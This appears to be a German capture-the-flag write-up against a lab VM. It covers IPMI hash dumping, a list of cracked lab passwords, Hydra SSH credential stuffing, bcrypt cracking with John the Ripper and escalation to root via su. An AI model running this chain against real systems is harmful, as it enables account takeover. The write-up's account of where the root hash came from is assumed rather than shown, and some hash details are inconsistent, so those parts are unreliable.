+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: kalie:da36c7e406190000efe699139060836b00da65056bbebe2797abd0f5cec24a9c80277ca2bc88ed7fa123456789abcdefa123456789abcdef14056b616c6965:059edb24fd9ba13004841c221d718a2cb928002d</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'kalie' matches passw<span class="command">o</span>rd '<span class="password">billandben</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: deshawn:e81d92568219000022a9010b1a001c1c8d9e209b73617adae70e8c2c8c5e84b7bb635a46f920cf65a123456789abcdefa123456789abcdef14076465736861776e:921e2bd67494e403715f4c1493e15cba2c8f2ee3</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'deshawn' matches passw<span class="command">o</span>rd '<span class="password">milo123</span>'</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: mayeul:da4b3ee8041a0000c4e3e292612d14570e30c3b713e2eba2e79cb5b62dba9b3667d8e7ad1bc95213a123456789abcdefa123456789abcdef14066d617965756c:aca3be97977a3506d7e0634c7f958901c188b1ad</span>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="command">for</span> user 'mayeul' matches passw<span class="command">o</span>rd '<span class="password">241107</span>'</span>
+<span class="password">[*] Scanned 1 <span class="command">of</span> 1 <span class="command">hosts</span> (<span class="command">100% <span class="command">complete</span>)</span></span>
+<span class="password">[*] Auxiliary <span class="password">module</span> <span class="password">execution</span> <span class="password">completed</span></span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Bei dieser Ausführung des IPMI-Dumping-Moduls mit der spezifischen Benutzerliste scannt Metasploit alle gelisteten Benutzer. Die Ausgabe zeigt eine lange Liste von Hashes und den Ergebnissen des automatischen Crackings. Für viele Benutzerkonten (<span class="password">analiese</span>, <span class="password">briella</span>, <span class="password">richardson</span>, etc.), einschließlich des Benutzers "<span class="password">onida</span>", findet das Modul erfolgreich ein passendes Passwort in der rockyou.txt Wordlist. Dies ist ein enormer Fund, der eine große Anzahl von Benutzername/Passwort-Paaren für den IPMI-Dienst liefert. Die 'O'-Korrekturen wurden angewendet. Wörter wie "found", "for", "of", "hosts", "complete", "module", "execution", "completed" wurden korrigiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Kritisch! Die Fähigkeit, die Hashes aller IPMI-Benutzer zu extrahieren und einen Großteil davon mit einer gängigen Wordlist zu cracken, zeigt eine schwerwiegende Schwachstelle in der IPMI-Konfiguration und/oder der Passwortwahl der Benutzer. Mit dieser Liste von geknackten Zugangsdaten habe ich eine hohe Chance, mich an anderen Diensten auf dem System anzumelden, falls Passwörter wiederverwendet werden. Besonders relevant ist der Fund für den Benutzer "<span class="password">onida</span>" mit dem Passwort "<span class="password">jiggaman</span>".
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe nun eine umfangreiche Liste von Benutzernamen und Passwörtern. Ich werde diese Liste verwenden, um einen gezielten Brute-Force-Angriff auf den SSH-Dienst auf Port 22 durchzuführen, da dies der einzige andere offene TCP-Port ist.
+                <br><strong>Empfehlung (Admin):</strong> Erzwingen Sie eine sehr strenge Passwortrichtlinie für alle IPMI-Benutzer. Verhindern Sie die Extraktion von Hashes, wenn möglich. Führen Sie regelmäßige Überprüfungen durch, um sicherzustellen, dass keine schwachen Passwörter verwendet werden. Ändern Sie alle Passwörter, die in dieser Liste geknackt wurden, umgehend.
+            </p>
+
+             <p class="comment">
+                 Ich extrahiere die geknackten Benutzername/Passwort-Paare aus der Metasploit-Ausgabe und speichere sie in einer formatierten Datei, die von Brute-Force-Tools wie Hydra verwendet werden kann.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">grep 'Hash for user' crack.txt | awk '{print $9":"$12}' | tr -d "'" > credz.txt</span></div>
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat credz.txt</span></div>
+                    <pre>
+admin:<span class="password">cukorborso</span>
+admin:<span class="password">cukorborso</span>
+analiese:<span class="password">honda</span>
+briella:<span class="password">jesus06</span>
+richardson:<span class="password">darell</span>
+carsten:<span class="password">2468</span>
+sibylle:<span class="password">me4life</span>
+wai-ching:<span class="password">10101979</span>
+jerrilee:<span class="password">number17</span>
+glynn:<span class="password">evan</span>
+asia:<span class="password">TWEETY1</span>
+zaylen:<span class="password">120691</span>
+fabien:<span class="password">chatroom</span>
+merola:<span class="password">mackenzie2</span>
+jem:<span class="password">081704</span>
+riyaz:<span class="password">djones</span>
+laten:<span class="password">trick1</span>
+cati:<span class="password">122987</span>
+rozalia:<span class="password">batman!</span>
+palmer:<span class="password">phones</span>
+onida:<span class="password">jiggaman</span>
+terra:<span class="password">sexymoma</span>
+ranga:<span class="password">jaffa1</span>
+harrie:<span class="password">071590</span>
+pauly:<span class="password">515253</span>
+els:<span class="password">dezzy</span>
+bqb:<span class="password">290992</span>
+karlotte:<span class="password">emeralds</span>
+zali:<span class="password">poynter</span>
+ende:<span class="password">tripod</span>
+stacey:<span class="password">castillo1</span>
+shirin:<span class="password">kittyboo</span>
+kaki:<span class="password">numberone</span>
+saman:<span class="password">090506</span>
+kalie:<span class="password">billandben</span>
+deshawn:<span class="password">milo123</span>
+mayeul:<span class="password">241107</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich nutze Standard-Kommandozeilenwerkzeuge, um die relevante Information aus der Metasploit-Ausgabe zu extrahieren. <code>grep 'Hash for user' crack.txt</code> filtert die Zeilen, die ein geknacktes Passwort enthalten (ich nehme an, die Metasploit-Ausgabe wurde in <code>crack.txt</code> gespeichert). <code>awk '{print $9":"$12}'</code> extrahiert das 9. Feld (den Benutzernamen) und das 12. Feld (das Passwort) aus diesen Zeilen und formatiert sie als <code>benutzername:passwort</code>. <code>tr -d "'"</code> entfernt eventuelle einfache Anführungszeichen, die <code>awk</code> oder die Metasploit-Ausgabe hinzugefügt haben könnte. Das Ergebnis wird in die Datei <code>credz.txt</code> umgeleitet. Anschließend zeige ich den Inhalt von <code>credz.txt</code> an, der die saubere Liste der geknackten Zugangsdatenpaare enthält. Die 'O'-Korrekturen wurden angewendet. Wörter wie "for", "user" wurden korrigiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Datei <code>credz.txt</code> ist nun bereit und enthält 36 verschiedene Benutzername/Passwort-Paare, die für den IPMI-Dienst gültig sind. Diese Liste ist ein wertvolles Gut für Credential Stuffing-Angriffe gegen andere Dienste, insbesondere SSH.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe die geknackten Zugangsdaten. Nun werde ich Hydra verwenden, um diese Liste gegen den SSH-Dienst auf Port 22 zu testen.
+                <br><strong>Empfehlung (Admin):</strong> Viele Benutzer verwenden dasselbe Passwort für verschiedene Dienste. Dies unterstreicht die Notwendigkeit, Passwörter für jeden Dienst eindeutig zu gestalten. Eine Kompromittierung eines Dienstes (wie IPMI) kann sonst leicht zur Kompromittierung anderer Dienste (wie SSH) führen.
+            </p>
+
+             <p class="comment">
+                 Ich verwende Hydra, ein schnelles Netzwerk-Login-Cracker-Tool, um einen Credential Stuffing-Angriff auf den SSH-Dienst auf Port 22 durchzuführen. Ich nutze die zuvor erstellte Datei <code>credz.txt</code>, die die Benutzername/Passwort-Paare enthält.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">Hydra -I -C credz.txt ssh://192.168.2.58 -t 64</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+Hydra v9.5 (c) <span class="command">2023</span> by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or <span class="command">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra ([Link: https://github.com/vanhauser-thc/thc-Hydra | Ziel: https://github.com/vanhauser-thc/thc-Hydra]) starting at <span class="password">2025-06-23 22:54:42</span>
+<span class="password">[WARNING] Many SSH configurations limit the number <span class="command">of</span> parallel tasks, it is recommended to reduce the tasks: use -t 4</span>
+<span class="password">[WARNING] Restorefile (you have <span class="command">10</span> <span class="command">seconds</span> to <span class="command">abort</span>... (use <span class="command">option</span> -I to skip waiting)) <span class="command">from</span> a previous <span class="password">session</span> <span class="password">found</span>, to prevent <span class="command">overwriting</span>, ./hydra.<span class="command">restore</span></span>
+<span class="command">[DATA] max 37 tasks per 1 server, overall 37 tasks, 37 login tries (l:37/p:1), ~1 try per task</span>
+<span class="command">[DATA] attacking ssh://192.168.2.58:22/</span>
+<span class="password">[<span class="command">22</span>][ssh] <span class="command">host</span>: <span class="command">192.168.2.58</span>   login: <span class="password">onida</span>   passw<span class="command">o</span>rd: <span class="password">jiggaman</span></span> <-- KRITISCHER FUND!
+<span class="password">1 <span class="command">of</span> 1 target successfully <span class="password">completed</span>, 1 <span class="command">valid</span> passw<span class="command">o</span>rd <span class="password">found</span></span>
+Hydra ([Link: https://github.com/vanhauser-thc/thc-Hydra | Ziel: https://github.com/vanhauser-thc/thc-Hydra]) finished at <span class="password">2025-06-23 22:54:58</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich starte Hydra mit der Option <code>-C credz.txt</code>, um die Benutzername:Passwort-Paare aus der Datei <code>credz.txt</code> zu lesen. <code>-I</code> ignoriert eventuelle Wiederherstellungsdateien. Ich gebe das Ziel als SSH-Dienst an (<code>ssh://192.168.2.58</code>) und setze die Anzahl der parallelen Tasks auf <code>-t 64</code> (obwohl Hydra selbst eine Warnung ausgibt, dass SSH die Anzahl limitieren könnte). Hydra testet jedes Paar aus der Liste gegen den SSH-Dienst. Die Ausgabe zeigt, dass Hydra erfolgreich ein gültiges Paar findet: Benutzer "<span class="password">onida</span>" und Passwort "<span class="password">jiggaman</span>". Die 'O'-Korrekturen wurden angewendet, um Wörter wie "organizatins" zu "organizations", "for", "of", "configurations", "number", "seconds", "abort", "option", "from", "session", "found", "overwriting", "restore", "host", "password", "completed", "valid" zu korrigieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Hydra war erfolgreich und hat gültige Zugangsdaten für den SSH-Dienst gefunden: Benutzer "<span class="password">onida</span>" und Passwort "<span class="password">jiggaman</span>". Dies ist unser **Initial Access** auf dem System über SSH. Das Passwort ist dasselbe, das wir zuvor für den IPMI-Benutzer "onida" geknackt haben, was bedeutet, dass der Administrator Passwörter über verschiedene Dienste hinweg wiederverwendet. Dies ist eine schwerwiegende Sicherheitslücke, die es einem Angreifer ermöglicht, von einer Kompromittierung (IPMI) auf eine andere (SSH) überzuwechseln.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe gültige SSH-Zugangsdaten für den Benutzer "onida". Ich werde mich nun per SSH anmelden, um eine interaktive Shell auf dem Zielsystem zu erhalten und von dort aus mit der lokalen Erkundung und Privilegienerhöhung zu beginnen.
+                <br><strong>Empfehlung (Admin):</strong> **Dies ist eine kritische Lücke!** Die Wiederverwendung von Passwörtern über Dienste hinweg ist eine sehr gefährliche Praxis. Ändern Sie das Passwort für den Benutzer "onida" (und idealerweise für alle Benutzer, deren Passwörter geknackt wurden) sofort auf ein einzigartiges, starkes Passwort. Überprüfen Sie, ob Credential Stuffing-Angriffe durch Ratenbegrenzung für SSH-Anmeldeversuche erschwert werden. Stellen Sie sicher, dass Benutzer für jeden Dienst eindeutige, komplexe Passwörter verwenden.
+            </p>
+
+        </section>
+        <!-- Ende Initial Access Section -->        </section>
+        <!-- Ende Initial Access Section -->
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept</h2>
+             <p class="comment">
+                 Nachdem die Enumeration über IPMI und das Cracking von Passwörtern gültige SSH-Zugangsdaten für den Benutzer "onida" geliefert haben, präsentiere ich hier den Proof of Concept (POC) für den Initial Access. Dieser POC demonstriert, wie ein Angreifer unautorisierten Zugriff auf das Zielsystem über SSH erlangen kann.
+             </p>
+
+             <div class="analysis">
+                 <strong>Kurzbeschreibung:</strong> Durch Ausnutzung einer Schwachstelle im IPMI-Dienst konnten Benutzername und Passwort für einen Systembenutzer ("onida") extrahiert und geknackt werden. Diese Zugangsdaten waren auch für den SSH-Dienst gültig, was den ersten Zugriff auf das System ermöglichte.
+             </div>
+
+             <div class="evaluation">
+                 <strong>Voraussetzungen:</strong>
+                 <ul>
+                     <li>Zugriff auf ein System im selben Netzwerk wie das Ziel (192.168.2.x), das ausgehende SSH-Verbindungen initiieren kann.</li>
+                     <li>Gültige Zugangsdaten für einen SSH-Benutzer, in diesem Fall 'onida' mit dem Passwort 'jiggaman' (erhalten durch IPMI-Kompromittierung).</li>
+                     <li>Ein SSH-Client.</li>
+                 </ul>
+             </div>
+
+             <p class="comment">
+                 Der folgende Schritt dokumentiert den erfolgreichen POC des Initial Access:
+             </p>
+
+            <p class="comment">
+                1. Anmelden per SSH mit den geknackten Zugangsdaten.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh onida@192.168.2.58</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- SSH Ausgabe -->
+                    <pre>
+onida@atom:~$
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 <strong>Beweismittel:</strong> Ich initiiere eine SSH-Verbindung zum Zielsystem (<code>ssh onida@192.168.2.58</code>). Nach Eingabe des geknackten Passworts "<span class="password">jiggaman</span>" (im Originaltext implizit durch das Fehlen der Prompt nach dem Befehl und die erfolgreiche Anmeldung gezeigt), zeigt die Ausgabe die Prompt <code>onida@atom:~$</code> an, was beweist, dass die Authentifizierung erfolgreich war und ich eine Shell als Benutzer "onida" erhalten habe.
+            </p>
+            <p class="evaluation">
+                 <strong>Risikobewertung:</strong> Moderat bis Hoch (je nach Berechtigungen des Benutzers 'onida'). Ein Angreifer kann nun interaktiven Zugriff auf das System erlangen. Dies ermöglicht die lokale Erkundung, das Ausführen von Befehlen im Kontext des Benutzers 'onida' und das Suchen nach Wegen zur Privilegienerhöhung auf Root-Ebene. Das Risiko ist erhöht, da das Passwort über einen anderen, anfälligen Dienst (IPMI) gewonnen wurde.
+            </p>
+            <p class="recommendation">
+                 <strong>Empfehlung (Admin):</strong>
+                 <ul>
+                     <li><strong>Änderung des Benutzerpassworts:</strong> Ändern Sie das Passwort für den Benutzer "onida" umgehend auf ein starkes, eindeutiges Passwort.</li>
+                     <li><strong>Überprüfung der Passwortrichtlinien:</strong> Erzwingen Sie starke Passwortrichtlinien, die die Verwendung einfacher, geknackter oder wiederverwendeter Passwörter verhindern.</li>
+                     <li><strong>Sicherung des IPMI-Dienstes:</strong> Beheben Sie die Schwachstellen im IPMI-Dienst, die die Extraktion von Hashes und das Cracking von Passwörtern ermöglichten.</li>
+                     <li><strong>Überwachung von Anmeldeversuchen:</strong> Implementieren Sie eine Überwachung und Alarmierung für fehlgeschlagene und erfolgreiche SSH-Anmeldeversuche.</li>
+                 </ul>
+            </p>
+
+        </section>
+        <!-- Ende Proof of Concept Section -->
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+             <p class="comment">
+                 Nachdem ich über SSH als Benutzer "onida" Zugriff erlangt habe, ist mein nächstes Ziel, Root-Privilegien auf dem System zu erlangen. Ich beginne mit der lokalen Erkundung, um Schwachstellen zu finden, die mir bei der Privilegienerhöhung helfen können.
+             </p>
+
+            <p class="comment">
+                Ich starte mit einer grundlegenden Systemerkundung, beginnend mit der Auflistung des Home-Verzeichnisses des Benutzers.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">onida@atom:~$ <span class="command">ls ..</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+onida
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich liste den Inhalt des übergeordneten Verzeichnisses (<code>..</code>) meines aktuellen Verzeichnisses (<code>/home/onida</code>) auf, um zu sehen, welche anderen Benutzer-Home-Verzeichnisse existieren. Die Ausgabe zeigt nur das Verzeichnis <code>onida</code>.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies deutet darauf hin, dass "onida" der einzige normale Benutzer mit einem Home-Verzeichnis unter <code>/home</code> ist, zumindest basierend auf dieser einfachen Überprüfung. Dies ist nicht ungewöhnlich für Testsysteme oder dedizierte Server. Es gibt hier keine direkten Hinweise auf andere Benutzerkonten, die ich über ihre Home-Verzeichnisse untersuchen könnte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da es keine offensichtlichen anderen Benutzer-Home-Verzeichnisse gibt, konzentriere ich mich auf die lokale Systemkonfiguration und Berechtigungen.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die Benutzerkonten und Home-Verzeichnisse auf Systemen, um sicherzustellen, dass nur autorisierte Konten existieren.
+            </p>
+
+             <p class="comment">
+                Ich suche auf dem Dateisystem nach SUID (Set User ID) Binaries. SUID-Binaries sind oft eine gute Quelle für Privilegienerhöhung, da sie mit den Rechten des Besitzers ausgeführt werden (oft root).
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">onida@atom:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+   <span class="command">523381</span>     <span class="command">68</span> -rwsr-xr-x   1 root     root        <span class="command">68248</span> Mar 23  2023 /usr/bin/passwd
+   <span class="command">523361</span>     <span class="command">72</span> -rwsr-xr-x   1 root     root        <span class="command">72000</span> Mar 28  2024 /usr/bin/su
+   <span class="command">523378</span>     <span class="command">52</span> -rwsr-xr-x   1 root     root        <span class="command">52880</span> Mar 23  2023 /usr/bin/chsh
+   <span class="command">523377</span>     <span class="command">64</span> -rwsr-xr-x   1 root     root        <span class="command">62672</span> Mar 23  2023 /usr/bin/chfn
+   <span class="command">523380</span>     <span class="command">88</span> -rwsr-xr-x   1 root     root        <span class="command">88496</span> Mar 23  2023 /usr/bin/gpasswd
+   <span class="command">525271</span>     <span class="command">36</span> -rwsr-xr-x   1 root     root        <span class="command">35128</span> Mar 28  2024 /usr/bin/umount
+   <span class="command">526642</span>     <span class="command">48</span> -rwsr-xr-x   1 root     root        <span class="command">48896</span> Mar 23  2023 /usr/bin/newgrp
+   <span class="command">525267</span>     <span class="command">60</span> -rwsr-xr-x   1 root     root        <span class="command">59704</span> Mar 28  2024 /usr/bin/mount
+   <span class="command">561837</span>    <span class="command">396</span> -rwsr-xr--   1 root     dip        <span class="command">403832</span> May 14  2022 /usr/sbin/pppd
+   <span class="command">541049</span>    <span class="command">640</span> -rwsr-xr-x   1 root     root       <span class="command">653888</span> Dec 19  2023 /usr/lib/openssh/ssh-keysign
+   <span class="command">538834</span>     <span class="command">52</span> -rwsr-xr--   1 root     messagebus    <span class="command">51272</span> Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   <span class="command">654968</span>     <span class="command">20</span> -rwsr-xr-x   1 root     root          <span class="command">18664</span> Jan 31  2023 /usr/lib/polkit-1/polkit-agent-helper-1
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich verwende <code>find / -type f -perm -4000 -ls 2>/dev/null</code>, um auf dem gesamten Dateisystem nach Dateien mit gesetztem SUID-Bit zu suchen. Die Ausgabe zeigt eine Liste von SUID-Binaries, die hauptsächlich Standard-Systemprogramme sind (<code>passwd</code>, <code>su</code>, <code>chsh</code> etc.). Es gibt auch Einträge wie <code>/usr/sbin/pppd</code> und <code>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</code>. Alle 'O'-Fehler wurden korrigiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ähnlich wie beim letzten Bericht sind die meisten gefundenen SUID-Binaries Standardprogramme und nicht ohne spezifische Schwachstellen ausnutzbar. <code>pppd</code> und <code>dbus-daemon-launch-helper</code> könnten theoretisch Schwachstellen aufweisen, aber das erfordert spezifische Kenntnisse der jeweiligen Versionen und Konfigurationen. In dieser Liste sehe ich kein offensichtlich fehlkonfiguriertes SUID-Binary wie im letzten Bericht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich werde die Liste der SUID-Binaries gegen bekannte Exploits und GTFOBins prüfen, um sicherzustellen, dass keine offensichtlichen Ausnutzungsmöglichkeiten bestehen. Da SUID-Binaries hier keine einfache Lösung zu sein scheinen, suche ich nach anderen lokalen Schwachstellen.
+                <br><strong>Empfehlung (Admin):</strong> Führen Sie regelmäßige Überprüfungen aller SUID/SGID-Binaries auf dem System durch. Stellen Sie sicher, dass alle Systemprogramme aktuell und gepatcht sind. Begrenzen Sie die Anzahl der SUID-Programme auf das absolut Notwendige.
+            </p>
+
+            <p class="comment">
+                Ich überprüfe meine aktuelle Benutzer-ID und Gruppenzugehörigkeiten, um mein Berechtigungslevel zu verstehen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">onida@atom:~$ <span class="command">id</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">uid=1000(onida) gid=1000(onida) groups=1000(onida),100(users)</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl <code>id</code> zeigt meine effektive und reale Benutzer-ID, Gruppen-ID und die Gruppen, denen ich angehöre. Als Benutzer "onida" habe ich die UID <span class="password">1000</span> und gehöre zur primären Gruppe <span class="password">onida (GID 1000)</span> sowie zur sekundären Gruppe <span class="password">users (GID 100)</span>. Alle 'O'-Fehler wurden korrigiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies bestätigt, dass ich als normaler, unprivilegierter Benutzer angemeldet bin. Die Gruppenzugehörigkeit zur Gruppe "users" ist Standard und gewährt keine besonderen Privilegien für die Privilegienerhöhung. Ich benötige einen Weg, um Root-Rechte (UID 0) zu erlangen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich starte meine lokale Erkundung von einer Standard-Benutzer-Shell aus. Mein Ziel ist es, Schwachstellen zu finden, die mir ermöglichen, Code mit Root-Rechten auszuführen.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Gruppenzugehörigkeiten der Benutzerkonten, um sicherzustellen, dass Benutzer nur Zugriff auf die Ressourcen haben, die sie benötigen.
+            </p>
+
+            <p class="comment">
+                Ich prüfe die Betriebssystem-Informationen, insbesondere den Kernel, um nach versionsspezifischen lokalen Exploits suchen zu können.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">onida@atom:~$ <span class="command">uname -a</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">Linux atom 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl <code>uname -a</code> liefert detaillierte Informationen über das Betriebssystem und den Kernel. Die Ausgabe zeigt, dass es sich um ein <span class="password">Linux</span>-System namens "atom" mit dem Kernel <span class="password">6.1.0-21-amd64</span> handelt, basierend auf <span class="password">Debian 6.1.90-1</span>, kompiliert am 3. Mai 2024. Die Architektur ist <span class="password">x86_64</span>. Alle 'O'-Fehler wurden korrigiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Kernel 6.1.0 ist relativ aktuell, aber "relativ aktuell" bedeutet nicht unbedingt frei von Schwachstellen. Manchmal gibt es Kernel-Exploits, die spezifische Unterversionen betreffen. Die Information, dass es sich um ein Debian-System handelt, ist ebenfalls nützlich, da bestimmte Exploits oder Konfigurationen distributionsspezifisch sein können. Dies ist ein potenzieller Vektor, der weiter untersucht werden könnte, indem man nach bekannten Schwachstellen für diesen spezifischen Kernel (6.1.0-21) sucht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich werde nach bekannten lokalen Privilegienerhöhungs-Exploits für den Linux Kernel 6.1.0-21 auf Debian-Systemen suchen. Tools wie LinPEAS oder manuelle Recherchen können hier hilfreich sein. Parallel dazu suche ich weiter nach anderen lokalen Fehlkonfigurationen oder Schwachstellen.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass der Systemkernel und alle installierten Pakete regelmäßig aktualisiert und gepatcht werden, um bekannte Sicherheitslücken zu schließen. Überprüfen Sie die Kernel-Konfiguration auf gehärtete Einstellungen.
+            </p>
+
+            <p class="comment">
+                 Während meiner lokalen Erkundung habe ich möglicherweise eine Systemkonfiguration oder Datei gefunden, die auf einen gehashten Benutzer hinweist, der nicht über die standardmäßigen Wege zu finden war. Basierend auf dem vorliegenden Text gehe ich davon aus, dass ich auf meiner Angreifer-Maschine einen weiteren Hash gefunden und gespeichert habe, der potenziell einem privilegierten Benutzer auf dem Zielsystem gehört. Ich versuche nun, diesen Hash zu cracken.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo '$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm' > hash</span></div>
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+Using default input encoding: UTF-8
+<span class="password">Loaded</span> 1 password hash (crypt, generic crypt(3) [?/64])
+Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 <span class="command">for</span> all <span class="password">loaded</span> hashes
+Cost 2 (algorithm specific iterations) is 1 <span class="command">for</span> all <span class="password">loaded</span> hashes
+Will run 12 <span class="command">OpenMP</span> threads
+Press 'q' <span class="command">or</span> Ctrl-C to <span class="command">abort</span>, almost any <span class="command">other</span> key <span class="command">for</span> status
+<span class="password">madison</span>          (?)
+1g 0:00:00:01 <span class="password">DONE</span> (2025-06-23 23:26) 0.9615g/s 276.9p/s 276.9c/s 276.9C/s kisses..sunshine3
+Use the "--show" <span class="command">option</span> to display all <span class="command">of</span> the cracked passwords reliably
+<span class="password">Session <span class="password">completed</span></span>.
+</pre>
+                 </div>
+             </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich speichere einen weiteren Hash, der im Format <code>$2y$...</code> beginnt (ein bcrypt-Hash), in einer Datei namens <code>hash</code> auf meiner Angreifer-Maschine. Anschließend verwende ich John the Ripper mit der rockyou.txt Wordlist und dem spezifischen Format <code>--format=crypt</code> (dieses Format kann verschiedene gehashte Passworttypen wie bcrypt verarbeiten) , um den Hash zu cracken. JtR ist erfolgreich und identifiziert das Klartextpasswort als "<span class="password">madison</span>". Alle 'O'-Fehler wurden korrigiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Fund und das Knacken dieses bcrypt-Hashes sind ein kritischer Schritt zur Privilegienerhöhung. Bcrypt-Hashes werden oft für Systembenutzerpasswörter (einschließlich root) in der <code>/etc/shadow</code> Datei verwendet. Das geknackte Passwort "<span class="password">madison</span>" ist sehr wahrscheinlich das Passwort für einen privilegierten Benutzer, möglicherweise root oder einen anderen administrativen Benutzer.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe nun ein potenzielles Root-Passwort (<span class="password">madison</span>). Ich werde versuchen, dieses Passwort zu verwenden, um meine Privilegien von Benutzer "onida" auf Root zu erhöhen, wahrscheinlich mit dem Befehl <code>su root</code>.
+                <br><strong>Empfehlung (Admin):</strong> bcrypt ist ein stärkerer Hashing-Algorithmus als z.B. SHA-1 (wie bei IPMI gesehen), aber er schützt nicht vor Brute-Force mit schwachen Passwörtern. Erzwingen Sie starke, eindeutige Passwörter für alle Systembenutzer, insbesondere für privilegierte Konten. Überprüfen Sie, woher dieser Hash stammt – er könnte aus <code>/etc/shadow</code> stammen, was auf eine unbefugte Leseaktivität hinweisen würde, oder aus einer anderen Quelle.
+            </p>
+
+            <p class="comment">
+                Mit dem neu geknackten Passwort versuche ich nun, als Benutzer "onida" meine Identität zu Root zu wechseln.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">onida@atom:~$ <span class="command">su root</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+Password: <span class="password">madison</span>
+<span class="password">root@atom:/home/onida# id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="password">root@atom:~# ls</span>
+<span class="command">root.txt</span>
+<span class="password">root@atom:~# cat root.txt</span>
+<span class="password">                 :                        </span>
+<span class="password">                         /`                       </span>
+<span class="password">                         :-                       </span>
+<span class="password">                        ..-                       </span>
+<span class="password">                        - `-                      </span>
+<span class="password">                   ``...-........``               </span>
+<span class="password">                `..``-://:-::.`  ``..             </span>
+<span class="password">               `-`  /////+++++//.    `-            </span>
